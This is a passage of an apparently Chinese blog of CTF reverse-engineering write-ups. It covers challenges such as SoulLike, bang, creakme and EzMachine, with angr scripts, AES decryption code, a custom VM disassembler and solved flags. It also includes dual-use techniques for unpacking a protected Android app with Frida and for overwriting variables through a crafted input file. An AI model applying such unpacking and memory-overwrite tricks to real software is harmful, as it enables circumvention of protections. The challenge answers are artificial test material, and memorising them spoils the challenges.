class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">81</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">81</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dg03[i]!=sudoku[i])&#123;</span><br><span class="line">            flag[cnt]=sudoku[i];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">        flag[i]+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        flag[i]=flag[i]+<span class="number">20</span>;</span><br><span class="line">        flag[i]=flag[i]&amp;<span class="number">0xF3</span>|~flag[i]&amp;<span class="number">0xC</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> t=flag[i];</span><br><span class="line">        flag[i]=flag[i+cnt/<span class="number">2</span>];</span><br><span class="line">        flag[i+cnt/<span class="number">2</span>]=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> t=flag[i];</span><br><span class="line">        flag[i]=flag[i+<span class="number">1</span>];</span><br><span class="line">        flag[i+<span class="number">1</span>]=t;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rev-ACTF新生赛2020-SoulLike"><a href="#rev-ACTF新生赛2020-SoulLike" class="headerlink" title="[rev][ACTF新生赛2020]SoulLike"></a>[rev][ACTF新生赛2020]SoulLike</h2><ol>
<li><p>前4个字节为actf</p>
</li>
<li><p>长度为11</p>
</li>
<li><p>验证函数超级大</p>
<p>rbp-0x58保存用户输入指针</p>
</li>
<li><p>angr一把梭(因为看了这个函数之后，发现无非就是异或相加之类的，很适合angr去求解)</p>
<p>actf{b0Nf|Re_LiT!</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./SoulLike&#x27;</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simulation_manager(state)</span><br><span class="line">s.explore(find=<span class="number">0x411065</span>,avoid=<span class="number">0x411028</span>)</span><br><span class="line">print(s.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>看了wp之后发现自己粗心了，如果错了会告诉哪一位错了，所以可以按位爆破</p>
<h2 id="rev-网鼎杯-2020-青龙组-bang"><a href="#rev-网鼎杯-2020-青龙组-bang" class="headerlink" title="[rev][网鼎杯 2020 青龙组]bang"></a>[rev][网鼎杯 2020 青龙组]bang</h2><ol>
<li><p>梆梆加固</p>
</li>
<li><p>使用frida脱壳<a target="_blank" rel="noopener" href="https://github.com/GuoQiang1993/Frida-Apk-Unpack">GitHub - GuoQiang1993/Frida-Apk-Unpack</a></p>
<p>网上有个之前的方法，具体看了一下，那个梆梆加固似乎没调用OpenMemory函数，所以通过hook OpenMemory函数已经不管用了。这个最新版的Hook了OpenCommon。似乎也是我手机的问题，Android 7。具体要等后续手动分析壳</p>
<p>过程：通过 /proc/pid/maps查看应用对应的映射，找到相应的库，使用IDA分析</p>
</li>
<li><p>使用dex2jar分析</p>
</li>
<li><p>得到flag</p>
</li>
</ol>
<p>flag{borring_things}</p>
<h2 id="rev-SCTF2019-Strange-apk"><a href="#rev-SCTF2019-Strange-apk" class="headerlink" title="[rev][SCTF2019]Strange apk"></a>[rev][SCTF2019]Strange apk</h2><ol>
<li><p>前12个base64编码</p>
</li>
<li><p>然后取奇数号字符</p>
</li>
</ol>
<p>sctf{W3lc0me~t0_An4r0id-w0rld}</p>
<h2 id="rev-Dig-the-way"><a href="#rev-Dig-the-way" class="headerlink" title="[rev]Dig the way"></a>[rev]Dig the way</h2><ol>
<li><p>以文件作为输入</p>
</li>
<li><p>注意文件是可能覆盖v8的</p>
</li>
<li><p>v8[3]=0&amp;&amp;v8[3]=func3(v8,2,3)=abs(v8[3])-abs(v8[3]+v8[2])+abs(v8[2])+2</p>
<p>v8[2]=func2(v8,1,2)=abs(v8[1]+v8[2])-abs(v8[2])-abs(v8[1])+2</p>
<p>v8[1]=1</p>
<p>swap(v8[0],v8[1])</p>
<p>发现不可能满足条件，遂寻找wp</p>
</li>
<li><p>第一次循环交换的是v8[v12]和v8[v13]，所以可以直接覆盖v12和v13，达成函数的交换</p>
<p>v8[2]=abs(v8[1])+abs(v8[2])-abs(v8[1]+v8[2])+2</p>
<p>v8[3]=abs(v8[2]+v8[3])-abs(v8[2])-abs(v8[1])+2</p>
</li>
<li><p>经过计算v8[2]=1,v8[3]=-1</p>
<p>Offset      0  1  2  3  4  5  6  7   8  9 10 11 12 13 14 15</p>
<p>00000000   3F 3F 3F 3F 3F 3F 3F 3F  3F 3F 3F 3F 3F 3F 3F 3F<br>00000016   3F 3F 3F 3F 33 33 33 33  33 33 33 33 01 00 00 00<br>00000032   FF FF FF FF 07 00 00 00  08 00 00 00  </p>
</li>
</ol>
<p>flag: 8cda1bdb68a72a392a3968a71bdb8cda</p>
<h2 id="rev-SCTF2019-creakme"><a href="#rev-SCTF2019-creakme" class="headerlink" title="[rev][SCTF2019]creakme"></a>[rev][SCTF2019]creakme</h2><ol>
<li><p>进入程序</p>
</li>
<li><p>跟踪输入发现AES算法(使用PEID扫描也可以)</p>
</li>
<li><p>调试发现初始向量，密钥扩展函数找到密钥</p>
</li>
<li><p>密文使用base64加密了</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;sycloversyclover&#x27;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=&#x27;</span></span><br><span class="line">c = base64.b64decode(s)</span><br><span class="line">print(len(c),c)</span><br><span class="line">aes = AES.new(key=key,mode=AES.MODE_CBC,iv=<span class="string">b&#x27;sctfsctfsctfsctf&#x27;</span>)</span><br><span class="line">p = aes.decrypt(c)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>

<h2 id="rev-GKCTF2020-EzMachine"><a href="#rev-GKCTF2020-EzMachine" class="headerlink" title="[rev][GKCTF2020]EzMachine"></a>[rev][GKCTF2020]EzMachine</h2><ol>
<li><p>IDA搜索字符串发现不了什么，但是命令行有输出，在导入表里面发现WriteFile和WriteConsoleW</p>
<p>分别在这两个函数位置下断点，发现程序使用WriteFile输出</p>
</li>
<li><p>程序似乎加了壳，可以使用调试器加载，然后在要输出plz input的时候使用Scylla插件dump下来继续分析</p>
</li>
<li><p>WriteFile断下后，回溯分析，找到主函数D61580</p>
</li>
<li><p>发现这是个虚拟机程序</p>
</li>
<li><p>流程</p>
<p>小写字母全部异或71后+1</p>
<p>大写字母全部异或75后-1</p>
<p>所有字符都除16，商和余数保存</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode</span></span><br><span class="line">opc = [<span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x2b</span>, <span class="number">0x0</span>, <span class="number">0x14</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x61</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x1a</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7a</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0x1a</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x47</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x41</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x5a</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x4b</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x13</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x5b</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x22</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x59</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x4e</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 nop eip+=1</span></span><br><span class="line"><span class="string">1 v0=[eip+1],v1=[eip+2],reg[v0]=v1 eip+=3</span></span><br><span class="line"><span class="string">2 v0=[eip+1],push v0</span></span><br><span class="line"><span class="string">3 push reg[v0]</span></span><br><span class="line"><span class="string">4 pop reg[v0]</span></span><br><span class="line"><span class="string">5 output</span></span><br><span class="line"><span class="string">6 reg[v0]+=reg[v1]</span></span><br><span class="line"><span class="string">7 reg[v0]-=reg[v1]</span></span><br><span class="line"><span class="string">8 reg[v0]*=reg[v1]</span></span><br><span class="line"><span class="string">9 两个寄存器分别保存reg[v0]/reg[v1]的除数和余数</span></span><br><span class="line"><span class="string">10 reg[v0]^=reg[v1]</span></span><br><span class="line"><span class="string">11 eip=3*v0-3</span></span><br><span class="line"><span class="string">12 reg[v0]-reg[v1]并将结果保存在标志寄存器</span></span><br><span class="line"><span class="string">13 lags=0: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">14 flags=1: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">15 flags&gt;0: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">16 flags&lt;0: </span></span><br><span class="line"><span class="string">17 输入,DA5BA8存储字符串,DA5BDC存储长度</span></span><br><span class="line"><span class="string">18 某加密函数</span></span><br><span class="line"><span class="string">19 reg[v0]=stack[DA5BD0+reg[v1]]</span></span><br><span class="line"><span class="string">20 reg[v0]=DA5BA8[reg[v1]]</span></span><br><span class="line"><span class="string">FF exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">eip = <span class="number">0</span></span><br><span class="line">esp = <span class="number">0</span></span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> eip&lt;len(opc):</span><br><span class="line">    inst = opc[eip]</span><br><span class="line">    v0=opc[eip+<span class="number">1</span>]</span><br><span class="line">    v1=opc[eip+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> inst==<span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=%d&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;push %d;esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;push reg[%d];esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp-=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;pop reg[%d]; esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;output&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">6</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]+=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]-=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">8</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]*=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">9</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]/reg[%d] ;--------&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]^=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">11</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jmp %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">12</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;cmp reg[%d],reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">13</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;je %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">14</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jne %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">15</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jg %02X&#x27;</span>%(v0*<span class="number">3</span><span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">16</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jl %02X&#x27;</span>%(v0*<span class="number">3</span><span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">17</span>:</span><br><span 